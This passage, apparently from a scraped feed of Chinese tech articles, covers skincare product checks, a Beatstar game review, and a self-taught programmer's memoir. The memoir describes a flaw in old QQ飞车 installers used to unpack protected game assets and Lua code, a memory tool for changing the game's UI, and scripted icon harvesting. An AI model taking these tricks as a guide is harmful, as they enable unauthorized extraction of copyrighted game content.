src=\"https://cdn.sspai.com/2021/07/15/58fa33feb4cef3185a5111eda72fe7b5.jpg\"><figcaption>贝芙雅眼膜</figcaption></figure><h2><strong>题外话：一些科普</strong></h2>\n<h3>如何查询护肤化妆品是否三无品牌？</h3>\n<p>随着国货护肤化妆品的崛起，每隔一段时间就会有新品牌诞生，营销漫天，品牌更迭，我们要学会擦亮双眼，防止被三无微商品牌欺骗。</p>\n<h4>方式一：直接向商家索要备案信息</h4>\n<p>最简单粗暴的方式，就是礼貌询问商家是否具有国家备案，能否出示？一般情况下，正常品牌都会大方亮出备案信息，让消费者放心。当然，也不排除有「假」备案，作为一个有警惕心的成年人，我们可以再根据方法二进行反向验证。至于三无品牌，自然是什么备案都没有的。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/15/1bfd3ae918a4c28c09d4187b9e4e527b.jpg\"><figcaption>向客服索要备案信息</figcaption></figure><h4>方式二：通过「国家药品监督管理局」查询</h4>\n<p>在「国务院小程序-便民服务-消费-化妆品查询」中，我们可以通过输入商品名称，轻松查询到国家备案护肤化妆品。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/15/12497a982464f6220d8a0d536aec88d9.jpg\"><figcaption>反向验证备案信息</figcaption></figure><h3>「械」字号和「妆」字号有什么区别？</h3>\n<p>可能有实操执行力很强的小伙伴会发现，使用上述方法二，并不能找到文中安利的贝芙雅眼膜，难道它是三无产品？这就需要介绍一下「械」字号和「妆」字号了。</p>\n<p>「械字号」产品属于医疗器械，在生产中的卫生条件可能比「妆字号」产品更严格一些，对生产车间的洁净程度有明确要求（至少 30 万级，这个数字越小越好）。也就是说，「械字号」产品因为卫生等级更高，防腐剂可能会加得少一点。</p>\n<p>贝芙雅眼膜作为「械」字号产品，自然无法在国家化妆品目录中被查询到，需要根据产品所标注「医疗器械注册证编号」前往相应药监网查询。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/15/4a3b8592fc4b1130dd76a6ef196373a5.jpg\"><figcaption>「械」字号产品备案</figcaption></figure><p>而化妆品上标注的「妆字号」，是非特殊用途化妆品经药品监管部门备案后获得的许可证标号。我们通常使用的普通护肤化妆品一般为「妆字号」产品，主要作用是清洁、保护、美化、修饰等，对生产中的卫生条件没有固定要求。</p>\n<h3>「械」字号一定比「妆」字号更好吗？</h3>\n<p>不一定。医疗器械和化妆品属于不同种类的产品，<strong>其使用场景和使用目的截然不同</strong>。随着医学美容产业的发展，市场上出现了“械字号”医疗器械产品。其中一部分医用敷料（俗称「医美面膜」）一般是和医美项目配套使用的，可以帮助患者在接受医美治疗后康复，但这不代表效果更好。</p>\n<hr>\n<p>上文便是我个人自购并觉得还不错的国货个护美妆产品，仅代表个人主观使用感受。个护美妆产品本来就是<strong>甲之砒霜乙之蜜糖</strong>，有人觉得好用，一定也有人觉得踩雷，欢迎在评论区分享使用体验。种草有风险，买买需谨慎，请大家根据自身情况理性种草产品，买到手后务必做好耳后皮肤测试再使用哦！</p>\n","link":"https://sspai.com/post/67722"},{"title":"强大的欧美曲库助力，手感上乘的竖屏音游新作：Beatstar","date":"2021-09-04 03:09:16","description":"\n<p>节奏大师暂停运营的消息让许多音游老玩家为之遗憾，因为音游有着它独一无二的玩家群体，不同类型的音游形式也满足了各类玩家对于节奏的痴迷。细数一下，有没有发现这些音游都有同一个特征：横屏。</p>\n<p>以前手机尺寸还不太大，横屏可以扩大视野、容纳更多按键和敲击面积；而如今大屏当道，横屏游戏的难度也渐渐上去了。难度越高按键和敲击点位就越多，大拇指难以覆盖屏幕中央，断了 Combo 有多痛苦，音游玩家就有多恼怒。</p>\n<p>英国游戏公司 Space Age 与「打架游戏专业户」SuperCell 合作，推出了竖屏节奏音游 Beatstar，这款游戏还坐拥新潮而强大的「三次元」曲库，让我们一边听 Diva 唱歌一边施展指尖功夫吧。</p>\n<figure class=\"ss-imgRows\" figcaption=\"听 Diva 在唱歌\"><img src=\"https://cdn.sspai.com/editor/u_/c4onkndb34t818p9ao7g.jpeg\" alt=\"\"><img src=\"https://cdn.sspai.com/editor/u_/c4onknlb34t82k08ga7g.jpeg\" alt=\"\"></figure><p>如果你玩过节奏大师，上手 Beatstar 就没有学习成本，相比节奏大师动辄五六个按键，Beatstar 只有三个按键，但倘若你掉以轻心，那就会像我一样连第一首歌都拿不到五星好评。Beatstar 对于「完美」的判定还算宽松，只是要想拿高分就必须得到「完美+」判定。</p>\n<p>Beatstar 将敲击位置分成了三个区域，当方块上的发光横线与敲击区域的横线平齐时就能得到「完美+」，此时整个方块与凹槽严丝合缝；如果发光横线没有与凹槽中的横线平齐，但仍然保持在有颜色的区域，那么就会得到「完美」；如果发光横线只是在凹槽当中，那就只能得到「还好」判定，同时 Combo 会被打断。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/03/bb7a33f4e4ef8bbc6977246911d4378d.png\"></figure><p>惩罚方面，丢失节奏会结束 Combo 加成，点错节奏则直接判定失败，无氪党没有宝石续命的话，大侠还请重新来过。</p>\n<figure class=\"ss-imgRows\" figcaption=\"完美+不是那么容易，丢失 Combo 也很糟心\"><img src=\"https://cdn.sspai.com/editor/u_/c4onkntb34t818p9ao80.jpeg\" alt=\"\"><img src=\"https://cdn.sspai.com/editor/u_/c4onko5b34t818p9ao8g.jpeg\" alt=\"\"></figure><p>无论是节奏大师还是 Cytus，除了连续而密集的打击能够提升音游挑战性以外，各种节奏手势也在另一个维度上提高了游戏难度。在这方面，Beatstar 具有长按和滑动两种手势，遇到滑动方块还需要根据箭头指示滑向四面八方，难易程度和节奏大师那种「蛇形」手势相比不分伯仲。</p>\n<p>另外，Beatstar 还能调动线性马达的振动反馈替代传统音游中的按键节奏音，长按手势时还会根据音乐节奏间歇性震动，手感非常不错。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4onkodb34t813bf0v8g.gif\"><figcaption>我的手不听我使唤了</figcaption></figure><p>对于音游来说，曲库无疑是吸引玩家的重要因素，这也是 Beatstar 的另一个特色。目前大部分音游曲库主要还是来自动漫或是开发商自编歌曲，虽然同样具有挑战性，但不太关注动漫的玩家可能很容易失去兴趣。Beatstar 则和华纳等主流唱片公司达成了版权合作，为玩家带来了 The Weeknd、Ariana、LadyGaGa、Sia 等诸多国际知名<s>小品表演艺术家</s>歌手的作品，其中不乏经典歌曲和代表作，游戏加载界面还会普及一些乐坛小知识。</p>\n<figure class=\"ss-imgRows\" figcaption=\"你知道吗？\"><img src=\"https://cdn.sspai.com/editor/u_/c4onkolb34t82k08ga80.jpeg\" alt=\"\"><img src=\"https://cdn.sspai.com/editor/u_/c4onkp5b34t82k08ga8g.jpeg\" alt=\"\"></figure><p>曲库扩展除了氪金之外，玩家能够通过游戏和看广告来积攒卡片和箱子，不同类型的箱子能够开出不同风格的音乐。不过需要注意的是，开箱子需要一定时间，没有空槽位之后玩家就不能继续游戏了，这也是另一种「体力」限制（氪金能解决一切问题）。</p>\n<p>解锁槽位设计目前在 Google Play 商店中已经遭到了大量用户的吐槽，官方也在回复中表示接下来可能会对这一机制进行修改。</p>\n<figure class=\"ss-imgRows\" figcaption=\"箱子里能开出许多知名作品\"><img src=\"https://cdn.sspai.com/editor/u_/c4onkpdb34t818p9ao90.jpeg\" alt=\"\"><img src=\"https://cdn.sspai.com/editor/u_/c4onkplb34t82k08ga90.jpeg\" alt=\"\"></figure><p>Beatstar 里在游戏氛围渲染方面也非常出色。游戏会从每个专辑封面中选取一个主题色，这个主题色会随游戏进度逐渐出现在画面当中。游戏过程对应着多个「阶段」，第一热身阶段比较简单，节奏方块缓慢而稀疏，画面也比较暗淡；随着音乐进入高潮部分，节奏方块的速度和密度也会增加，主题色会根据 Combo 次数逐渐填充到各个角落，一旦玩家失去 Combo，整个画面瞬间变回灰色。即使玩家注意力没有集中在分数上，整个屏幕从彩色变成灰色也会在气氛上让玩家感到紧张。</p>\n<figure class=\"ss-imgRows\" figcaption=\"每首歌曲都有它自己的主题色\"><img src=\"https://cdn.sspai.com/editor/u_/c4onkptb34t82dsrfmrg.jpeg\" alt=\"\"><img src=\"https://cdn.sspai.com/editor/u_/c4onkq5b34t818p9ao9g.jpeg\" alt=\"\"></figure><p>除了游戏本身，Beatstar 也做了社区排名。游戏中集成了 Supercell ID 账户系统，玩家可以直接与 Supercell 好友一起参与排名。分数超过某个好友后当然要在他面前「吹嘘」了，对方「复仇」成功时你也会收到来自他的炫耀。</p>\n<figure class=\"ss-imgRows\" figcaption=\"克莱德：没人在我的 BGM 里打败我\"><img src=\"https://cdn.sspai.com/editor/u_/c4onkqdb34t82dsrfms0.jpeg\" alt=\"\"><img src=\"https://cdn.sspai.com/editor/u_/c4onkqdb34t818p9aoa0.jpeg\" alt=\"\"></figure><p>除此之外，Beatstar 在检测到用户使用蓝牙耳机时会提示调整音频同步并且存储该设定，之后 Beatstar 可以根据播放设备自动切换设定，如果是有线耳机或手机外放则会切换到默认数值，玩家不需要每一次都进行调整，非常人性化。</p>\n<p>Beatstar 不仅曲库强大、上手简单，社交元素也非常有趣，是款值得尝试的音游新作。如果你也是音游爱好者，可以在 <a href=\"https://apps.apple.com/ca/app/beatstar/id1521483641?af_c_id=1627653745345&amp;shortlink=a82e107d&amp;c=Official%20Site&amp;pid=Websites&amp;af_click_lookback=7d&amp;af_channel=Space%20Ape\" target=\"_blank\">App Store</a> 和 <a href=\"https://play.google.com/store/apps/details?id=com.spaceapegames.beatstar\" target=\"_blank\">Google Play</a> 免费下载 Beatstar。现在绑定 Supercell ID 会赠送一首高难度的 Supercell 游戏主题曲，iOS 用户连接 Apple Music 后也还会额外赠送一首随机歌曲。</p>\n<span class=\"ss-application\" app-id=\"16157\"> </span><p>&gt; 下载少数派 <a href=\"https://sspai.com/page/client\">客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号</a> ，了解更多的新玩意 🆒</p>\n<p>&gt; 特惠、好用的硬件产品，尽在 <a href=\"https://shop549593764.taobao.com/?spm=a230r.7195193.1997079397.2.2ddc7e0bPqKQHc\">少数派sspai官方店铺</a> 🛒</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68593"},{"title":"怎么样的努力可以成为腾讯的游戏程序员？","date":"2021-09-03 09:22:56","description":"\n<p>没有科班经验，走过许多人生弯路，直到二十多岁的年纪决定重新开始，自学游戏开发技术，通过社招进入天美，这是我们身边同事阿升的故事。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-c0cab0f19dd765bfb8014425dcc4d32a_720w.jpeg?rss\" data-caption=\"\" data-size=\"small\" data-rawwidth=\"1000\" data-rawheight=\"751\" data-watermark=\"original\" data-original-src=\"v2-c0cab0f19dd765bfb8014425dcc4d32a\" data-watermark-src=\"v2-7737f4c0b893de18f8a7e689d4804845\" data-private-watermark-src=\"v2-a5a65f8feef00bfa156261c7944f24f4\"></p>\n<p>来到天美前，阿升因为喜欢《QQ飞车》，用了一年多时间，尝试独立开发一个移动版本，遇到种种困难，用了“最土的方法”去克服。后来在人生的低谷期，他写了一篇回顾性的博客，因此被项目组发掘，成为了一名正式的开发者。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-ca102f36630bdae60c536f0a3db46351_720w.jpeg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"292\" data-rawheight=\"29\" data-watermark=\"original\" data-original-src=\"v2-ca102f36630bdae60c536f0a3db46351\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>有人说他是自己见过“路子最野，学历最低”的程序员，面对弯路，他的态度或许像企微签名“疯狂漂移中...”一样，最终也殊途同归。</p>\n<p>经本人同意，我们转载了他撰写的博文，故事中有他犯过的错误，遇到的贵人，与努力的改正，希望对大家有所帮助。</p>\n<blockquote>注：原文较长，内容为可读性略有调整。</blockquote>\n<hr>\n<p>我在安徽出生，但在贵阳长大，因为个人原因，没有读过很多书，倒不是家里条件完全不允许，父母被气个半死拿我没辙。</p>\n<p>现在想起来，还是挺后悔的，多读书能少走很多弯路，只是那会儿不懂这个道理。</p>\n<p>无所事事了一段时间，跟家里关系也闹得很僵，后来大吵了一架，索性一个人跑去青岛找网友（男的，幸好不是坏人，好孩子也千万不要学）。</p>\n<p>身上只有几百块，憋着一口气不想回去啃老，也不想被亲戚看不起，就做各种零工赚钱。</p>\n<p>最难的时候几天吃不起饭，一桶水都喝光了，起床的力气都没有。床头柜上还有一星期前吃剩的馄饨汤，里面还有几片馄饨皮，闻了一下都有味道了。</p>\n<p>一咬牙，一口闷，这酸爽，够味！撑到朋友接济才挺了过来。</p>\n<p>我平时喜欢玩游戏，特别崇拜做游戏的人，感觉他们很牛，能把那么多好看的画面放到屏幕上，你还能控制它们。</p>\n<p>当时我认识一个游戏金团的人，在他的介绍下给他们打工刷装备，第一次知道了这些灰色产业。团里有人在用插件，是一种辅助工具，我什么都不懂，但背后的原理让我感到很好奇，觉得跟做游戏很像，电脑技术都很厉害！</p>\n<p>我动了学编程的念头，以前好像怎么都读不进书，但可能兴趣是最好的老师，忽然就开窍了。</p>\n<p>我泡在各种贴吧论坛，在网上一个词一个词地查，学了点散装的编程知识，试着自己上手改良和开发，当然没那么顺利，较劲一定要弄出来，折腾久了也算稍微懂了。</p>\n<p>金团效率高了，给我多发了点钱。中间我回了趟家，给我妈买了一只口红，给我爸买了一条中华，他们都很高兴，不是因为买了东西，而是因为儿子回来了。</p>\n<p>我觉得自己能挣钱了，变膨胀了，花钱大手大脚，还交友不慎。</p>\n<p>灰产终究是灰产，每个人都很急功近利，因为谁也不知道下一秒就会发生什么。一连串的变故很快发生，金团倒了，钱也没了，跟曾经信任的“朋友”打了一架，彻底撕破脸。</p>\n<p>现在回过头看，其实也是好事，让我从歧途中走了出来，而不是继续错下去。</p>\n<p>但在那一年，似乎我拥有的一切都消失了...... 我又陷入了一事无成的迷茫。</p>\n<p>舞房的朋友接纳了我，让我住在舞房，跟他们吃住一起，有小课叫我代代课，一节课下来给我一百来块钱。</p>\n<p>那阵子浑浑噩噩的，没课的时候就把头闷被窝里睡一天，电脑也不会去打开，晚上没事就跟朋友去酒吧喝酒。</p>\n<p>一个月下来，我在苏州的朋友过来玩，看见我说感觉我变了一个人，都不敢认我，外观也变化太大。很邋遢，面色蜡黄，胡子拉碴的，头发没有洗，乱七八糟的。</p>\n<p>过年回了趟家，不知道为什么，过完年我又回来了，继续住在舞房，继续堕落。潜意识是在躲避着什么，一直走不出来。</p>\n<p>朋友介绍我去大学教大学生跳舞，认识了一群不错的小伙子，练舞肯吃苦，想法也没有社会上的人那么复杂。</p>\n<p>我开始喜欢和他们混在一起，其实我年龄跟他们一样大，有些人比我还大。喜欢跟他们在一起我想不是因为年龄的原因，是因为他们阳光，热情。</p>\n<p>我长得显老，他们以为我比他们大，都叫我升哥。跟他们在一起半年，我走出来了，看开了，之前的事都过去了，在新的一年，我会重新来过。</p>\n<p>我终于又重新打开电脑了。</p>\n<p>我把以前的一切都删了。嫌麻烦，干脆直接重新装个系统，全盘格式化。我想做游戏，我的初心是做游戏啊！为什么我现在才醒悟过来，真是当局者迷。</p>\n<p>我以前有个志同道合的朋友，后来当.NET程序员了。</p>\n<p>听他说投腾讯简历直接被扔了！原因是要么学历不够，要么不需要.NET程序员。</p>\n<p>这小子不知道哪儿来的自信，其实我猜测他被拒的原因是这最致命的三点：看脸！看脸！看脸！</p>\n<p>我下定决定要学习做游戏了，找到他的QQ。</p>\n<p>我：我想做游戏，我应该从哪方面入手？</p>\n<p>他：C#、Unity。</p>\n<p>我那.NET程序员朋友在下文中我就用RRQ表示他的名字。</p>\n<p>上面提到我猜测他面试失败的原因，他表示十分不服气。（那好，咱们就不提脸的事！咱们聊聊体重！哈哈哈~）</p>\n<p>我们的相处风格就是这样，见面就是互损，即使很长时间不联系也不陌生。</p>\n<p>看到被黑了，他顶多会立马QQ上\"威胁\"我，让我给他发红包，不然这事跟我没完。</p>\n<p>RRQ就是这样人，人特别好，很有大神风范！每当我们谁写出几句酷炫代码或者酷炫功能的时候，我们就会找到对方，问对方这个牛不牛，能打多少分。</p>\n<p>我学习C#他没少帮助我！他是我的好基友，也是引导我走向正路的师傅。就像我快饿死的时候接济我的人一样，我把他也当成我的贵人。</p>\n<p>当务之急就是学习游戏编程。我下载了最新版本的VS和Unity，还不急着直接学Unity，从头在老老实实学一遍C#（说是老老实实学一遍，其实我也只是大概看了下 - -）。</p>\n<p>看着满屏幕的英文就头大！天啊，我英文那么差，这让我如何是好？</p>\n<p>英文差没法写代码吗？肯定不是啊，后来我才发现，只要会了基本语法，其他都小意思。</p>\n<p>取个变量名或方法名的时候，写拼音也太戳了，不够逼格！去网上翻译一下，再copy过来用。每次取名字就得在网页里面翻译，好麻烦，我干脆调用网页翻译API写了一个小翻译器。</p>\n<p>看别人代码的时候，几乎都是骆驼命名法，直接复制过来翻译器无法识别进行翻译，所以我还加了一个小功能，自动分割大写字母，这样的话，只要英文没有缩写，几乎都是可以成功翻译的，大大提高了翻译效率。</p>\n<p>我也是没办法，做了这么个翻译器，笨人得给自己想出补自己缺陷的方法来，不然真的就会一直笨下去了。</p>\n<p>网上说直接学Unity，可以一边做一边学，我也感觉自己C#应该算是入门了，那就直接上Unity吧。</p>\n<p>在自学网站找到了一个教Unity的视频，但是上了几节课以后发现老师的代码跟上节课的代码不一样，这尼玛太坑了。继续往下看，发现老师他自己似乎都不怎么会Unity，代码写错了都不知道哪儿错了，然后直接跳到下一节课！！</p>\n<p>干脆不看视频了，按照自己的想法来，想做什么游戏，需要哪些功能，怎么实现，全部都去网上查，需要什么查什么。</p>\n<p>当时有个小游戏很火：《钢琴块儿》。看起来好像挺简单的，那就试着自己做一个吧！</p>\n<p>我的一个钢琴块就是一个cube，排了几百个cube，看着好恶心，有时候想改变其中一个cube的坐标，其它块也得重新改一遍。我得用代码去自动生成这写钢琴块才行！研究了一个星期，我把cube做成预制件，for循环随机生成了指定的黑块和白块，完美！就是这效果！</p>\n<p>按耐不住兴奋，恨不得马上给RRQ玩到我的第一个简陋的游戏。但是我又犯难了，不会发布成apk。继续百度，发现好麻烦，要装sdk，下载下来以后，unity又提示版本不对啥的，换了一个，打包中途又报错。</p>\n<p>继续换版本，来来回回折腾了一个通宵，终于打出了属于我自己的第一个apk包，别提多激动了！插上数据线连上手机安装了apk，看着在手机屏幕上出现unity logo的时候，我激动得发抖，我也可以做游戏了！</p>\n<p>做出来了第一个简陋的游戏，我并没有想着去完善它。</p>\n<p>我特别喜欢玩《QQ飞车》，从08年就开始就一直在玩。当时iPhone上有个韩文的单机版跑跑卡丁车，特别有PC端的感觉。但是我又那么喜欢玩QQ飞车，看着QQ飞车说自己同时在线几百万人，也出来那么多年了，就是没有出手机版。</p>\n<p>官方不做，我自己做！我想自己做一个《手机版QQ飞车》，让和我一样期待飞车手机版的小伙伴们都能玩到这款游戏。</p>\n<p>我把想法告诉了RRQ，他很支持我，跟我说在做的过程中遇到问题解决问题，等你做出来了，你会发现你会很多东西了。</p>\n<p>他不会unity，我想他C#那么厉害，C#这样学肯定没问题，unity这样学应该也行，那就开干。</p>\n<p>想做QQ飞车，那得有QQ飞车的人物模型、赛车模型、地图模型、贴图、动画，如果要做界面，还需要得到UI资源。当然，如果能得到代码更好，就算看不懂，注释还可以参考一下嘛。</p>\n<p> QQ飞车早在08年~10年这两年的所有版本安装包，有个漏洞。</p>\n<p>使用游戏升级补丁，新建res、data两个空文件夹，在把res.vfs、data.vfs和几个配置文件复制到空文件夹同目录下。改一下配置文件中的版本号，选择这两个文件夹所在的父目录进行补丁安装，vfs数据包就会完完整整的释放到新建的两个空文件夹中。</p>\n<p>当时释放出来后可以直接看到lua代码，现在lua释放出来都转换成机器码了，只有小部分能反编译回来，没多大用处。</p>\n<p>我虽然释放出所有资源了，但是我无法使用资源，仅仅能看到lua的代码注释 ......</p>\n<p>还是那句老话，既然游戏自己都能用，那说明还是有方法让我自己也能使用的，只是我不知道而已。</p>\n<p>我又花费了三个月时间研究如何让我自己能使用这些模型。nif是模型文件，那我用3DMAX应该就可以打开吧，那玩意不是专门做模型的嘛。</p>\n<p>下载安装完成又发现无法识别nif文件！懵了。</p>\n<p>网上搜了一下，原来有现成的工具打开这种格式，支持预览和导出obj。</p>\n<p>导出obj我拿来干啥，我还需要动作啊！这下不好找了，网上都翻烂了就是没有，然后去谷歌搜。找了好久看到曙光了，有个nif 3DMax2012插件，有点小激动，安装完成后再次导入nif，成功了居然。</p>\n<p>但是模型还是没有动作呀！！动作去哪儿了！！我看到nif同级目录下有很多.kf文件，看命名挺像动画文件的。</p>\n<p>小手一抖，把kf文件拖到3DMax界面里，哎哟喂，人物会动了。导出成fbx，拖到unity里面等着看效果。尼玛，怎么不会动呢？在3DMax里面还好好的。我以为是我导出有问题，又重新导了一遍，还是老样子。</p>\n<p>那是不是unity要设置什么呢？查了一下，还真是。</p>\n<p>按照教程操作了一遍，欧耶，我的人物在unity里面动起来了。动是动起来了，但是这人物怎么感觉像是抽风了一样，一点不自然，在3DMax里面也不自然。</p>\n<p>加了一个3DMax的群询问大神们，得到的回复是有可能编辑器不一样，导致动画丢帧。</p>\n<p>看样子只能自己调了！我又去找教程学习如果调3DMax动画......</p>\n<p>三个月时间就研究这些东西了。</p>\n<p>拿了两张地图《老街管道》《休闲区城镇》、一辆赛车雷诺、一个男孩带动画的模型。</p>\n<p>我先做的休闲区，第一步目标是人物可以在休闲区里面移动就行了。</p>\n<p>网上看别人代码怎么写的，参考后用CharacterController完成了控制人物移动。</p>\n<p>目前是键盘控制人物移动，手机哪有键盘啊！官方QQ飞车可以用鼠标点击地面移动人物，那我也可以点击地面移动人物啊。</p>\n<p>又研究到了寻路，发现unity自带了寻路：Navigation。</p>\n<p>查了资料发现使用起来非常简单，很快，我就做出来我点击地面，人物就自动移动到我点击的位置。</p>\n<p>现在又得加一个点击座位，人物会自动跑过去坐着。这和点击寻路其实有些冲突，在手机上操作很不方便，屏幕太小，本来你是要走过去就行了，不小心碰到椅子就坐上去了。于是我把点击地面寻路改成了摇杆控制移动，又学习到了一款插件：EasyTouch。</p>\n<p>哦了，休闲区就算大功告成了！这第一步我没日没夜的做了一个月才做满意，不感觉累。</p>\n<p>第一步做完了，可是一点游戏的样子没有，我得做游戏界面，这样子看起来有逼格些。</p>\n<p>界面素材的文件后缀名是.gsa，这种格式我关注了一年多，但一直没有解开。</p>\n<p>得不到界面素材，我就去游戏里面截图，然后自己PS。</p>\n<p>游戏中控件和控件的层级关系很复杂，我压根就没法正常截图！我试着做了一个叫SuperGUI的工具，可以通过内存随意操作游戏中的UI大小、位置、显示或隐藏。</p>\n<p>我稍微修改了一下SuperGUI的代码，把我想截图的UI移动到白色底板的区域，然后再截图，完美！</p>\n<p>自己其实不会PS，修图什么的又得学......</p>\n<p>界面素材已搞定，现在就差怎么用到unity里，于是我又学会了使用一款unity插件：NGUI。</p>\n<p>我这人有强迫症，一定要尽量把UI都布局得很好看很合理。花费一个星期左右的时间完成了登录界面、主界面、休闲区界面。</p>\n<p>那时候还不知道xml和json这种东西，我想做背包，物品描述信息这些东西我要存起来才行，如果都写在代码里面那太蛋疼了。</p>\n<p>于是我又学会了使用一款小巧的数据库：SQLite。我把物品信息数据全部存到了数据库里，感觉清爽多了。</p>\n<p>做背包需要物品icon，咋办！我想到了用SuperGUI去截图，但是有很多绝版赛车商城里面没有，我也就没法截图。</p>\n<p>我发现QQ飞车每个星期都会更新任务，每次更新的时候本地游戏文件夹中有几个在资源包外的未加密lua文件会变化，于是我就打开这些lual研究。</p>\n<p>原来他把任务描述信息写到了lua里面，还有任务图标的本地资源路径呢。</p>\n<p>那我如果改了这个任务图标的资源路径，是不是任务图标就会变成我指定路径的图标？试了一下，果然行得通！但是每改一下必须重新登录游戏才能生效。</p>\n<p>我写了一个自动修改任务描述lua里的资源路径工具，并且修改完成后自动登录游戏，自动截取资源图标保存到指定文件夹中。</p>\n<p>就这样不停的登录退出，我笔记本挂机挂了三天三夜，没停过。我得到了三万多个物品图标。现在想想我真是个疯子，这么low的方法都能想得出来！不过应了我微信的个性签名：“有时最土的方法是最有效的”。</p>\n<p>如果我当时我不那样去做，我就没法得到我想要的图标。整整三万个图标，我需要逐个在PS中裁剪、休整。太麻烦了，还好PS有个记录操作的功能，全自动完成了休整三万个图标这艰巨的任务。</p>\n<p>图标有了，准备做背包，可是又犯难了！</p>\n<p>我切换的装备下次我进入游戏应该还在才对，我服务器都没有，怎么记录？对！我要写个服务器才行。</p>\n<p>自己不懂真正服务器，只能找人求救。</p>\n<p> C#服务器RRQ教我弄了SQLServer、教我三层架构......</p>\n<p>有一次他远程我电脑操作给我看，他操作了差不多一个小时，我经常熬夜做这个游戏，太累，中途我不小心睡着了。</p>\n<p> QQ连续响了好几声给我吵醒了，原来是他在一直发消息：“你丫是不是睡着了”、“看懂了吗？”、“说话啊！”</p>\n<p>这个我记得最清楚。他气死了，我说我没看到，他说没看到活该！哈哈哈，我这不是太困了吗！当时他挺生气，后来还是又教我一遍怎么弄的。搞了一段时间，飞车可以登录游戏、注册游戏信息、同步个人信息、记录背包信息之类的。</p>\n<p>不知道是谁跟我说的，你这游戏又不能玩，那能叫游戏吗？我想想说得也对。所以服务器暂停了开发。</p>\n<p>我开始做核心玩法，做竞速赛。</p>\n<p>核心玩法谈何容易，网上虽然说有很多赛车的例子，但是没有一个是能很容易操作的。</p>\n<p>我学习WheelCollider，自己写赛车移动！网上的代码一大堆，做出来的效果却差得要命。研究了一个月，我只做出了基本的前后左右移动，赛车漂移太难做了，始终做不出来。做不出来不强求，那就缓缓，过段时间再做。</p>\n<p>QQ飞车里面赛车撞墙后可以按R键复位到赛道中间，我分析了他的思路。自己花一个星期时间写了一个CarWayPoints插件。</p>\n<p>做完插件正休息呢，打开飞车的配置文件看看，每个地图都有一个Map.txt，里面存的数据我一直不知道是干嘛的。我用自己写的CarWayPoints插件原理去尝试理解这些数字到底是代表什么意思。</p>\n<p>没想到真的还被我分析出来了！我写了一个工具，自动转换这些数字，为我CarWayPoints插件使用的data文件，完美运用！</p>\n<p>看看时间，时间过得好快，马上快过年了！今年一年我没赚到钱，仅仅是够生活而已。</p>\n<p>虽然学unity才半年时间，但我鼓起勇气在网上投简历去找工作。</p>\n<p>确定上班时间是年后，正好拿这个当借口，我打电话回家告诉父母我找到工作了，先让他们高兴高兴。然后我接着又说，我过年不回家了，因为年后就要上班，我怕我来不及。</p>\n<p>当时我心里很难受，他们知道这个消息后也不舒服，可谁让我这么没本事呢，这一年仅凭教跳舞赚的钱太少了，让我省吃俭用过日子，哪还有脸回家。</p>\n<p>虽然我知道父母不要求我什么，能回去他们就满足了，可是我就是这么好强的一个人，对谁都这样。</p>\n<p>过年我啥也没买，就买了几包烟过年。街上一个人都没有了，卖煎饼的小贩也回家过年了。年前也没有去买菜，我知道过年那几天菜很贵，我也知道到上海后租房吃饭是大问题，所以只买了瓶老干妈回来。</p>\n<p>没菜，煮点白米饭，吃着老干妈，写了CarWaypoints插件的说明文档，发布到博客上，当时过年还是有挺多人看博客的，但写博客的人很少。</p>\n<p>我的那篇文章成了一个星期内阅读量最多的文章。年就这样过去了。</p>\n<p>过完年 ，我拖着行李来到了一线大城市——上海。</p>\n<p>记得第一次来上海面试的时候，不会做地铁，不知道怎么买票，站旁边看了好几个人买票自己才上去试一下，坐地铁还坐过站了。出站的时候我看见别人都是在上面刷一下就出去了，我也跟着在后面刷，可是我怎么刷，我都走不出去。排在我后面的人看见了跟我说要把卡片插进去才可以！后来才知道人家那用的是公交卡，跟我手里的卡不一样。</p>\n<p>小时候，电视上说什么上海滩、大上海，还有夜上海那首歌，给我的印象是上海很大，都是有钱人的地方。</p>\n<p>十几岁的时候，追过一个女孩，那女孩的爸爸好像在上海工作当老板，她放暑假寒假也会去上海上补习班，经常去星巴克。没有追到她，但是我心里一直都是有阴影的，感觉自己配不上人家。她家里那么有钱，人又漂亮，在上海呆过见过大世面，星巴克我从来没有进去过，我当时都不知道里面到底是卖什么东西的，只知道里面一杯饮料就好几十块钱。</p>\n<p>上海从小到大给我的感觉就是可望不可即！可是今天，我也来上海了，来实现我的游戏梦！</p>\n<p>当时来面试的时候公司在一个大厂房里面，新公司在装修，临时在大厂房工作。</p>\n<p>去上班的那天，新公司装修好了！哇，好大，装修好漂亮！</p>\n<p>前台领我坐到了我的位置上，我正式入职了！</p>\n<p>刚进公司什么SVN、RTX、禅道啥都不知道，还好有个胖胖的程序员帮我，他人很好，刚进公司就跟他最熟了。</p>\n<p>下班时间到了，大家都逐渐离开了公司。胖胖的程序员问：“你还不走想加班啊？！”</p>\n<p>我心想我哪有地方去啊，身上就只有几百块钱。我说这不是等你一起走吗？</p>\n<p>离开公司后，我搜索了附近的青年旅社，看了几家，要么是太远，要么是人满了。后来在上海南站附近找了一家青年旅社，一晚上好像是30块钱。</p>\n<p>在青年旅社住了几天，我发现这样下去还撑不到发工资我就没钱吃饭了。</p>\n<p>晚上下班等大家都走了，我悄悄问胖胖的程序员能不能睡在公司，他说如果你愿意大冷天的睡公司没问题啊。</p>\n<p>他以为我是开玩笑的，没想到我真睡了。</p>\n<p>我把公司休闲区的沙发搬到空调底下，对着空调吹暖和一些，可是还是冷得不行，一晚上冻醒四五次，根本睡不好。我想只要熬过这第一个月就好了！</p>\n<p>我半个月没洗澡，头发都油成了一坨，身上也一股味道，还好大家嘴巴上都没有嫌弃我。</p>\n<p>我把剩下的钱一咬牙，找了一家最便宜的能洗澡的宾馆，300块钱，住了一晚上，把脏袜子洗了，然后洗了个澡！这是我半个月以来睡得最舒服的一次。</p>\n<p>钱花光了，没钱